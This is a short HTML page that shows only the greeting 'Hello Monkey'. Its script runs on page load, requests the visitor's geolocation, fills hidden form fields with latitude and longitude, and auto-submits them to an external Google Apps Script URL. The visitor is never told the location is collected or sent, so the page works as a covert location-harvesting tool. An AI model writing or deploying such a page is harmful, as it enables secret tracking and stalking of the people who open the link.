<script>


function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    
  }
}

function showPosition(position) {
  document.getElementById("lat").value =  position.coords.latitude  ;
  document.getElementById("long").value =  position.coords.longitude;
document.getElementById("s").submit();
    
}
</script>
<body onload="getLocation()">
<h1>Hello Monkey</h1>
<form id="s" method="post" action="https://script.google.com/macros/s/AKfycbxnOEI75biZTFB5ojn0Q4tJyGeLoPdSGYr7PkXXhY-GEFTMZkw/exec">
    <input type="text" style="display:none" id="lat" name="latitude">
    <input type="text" style="display:none" id="long" name="longitude">
    </form>
    </body>
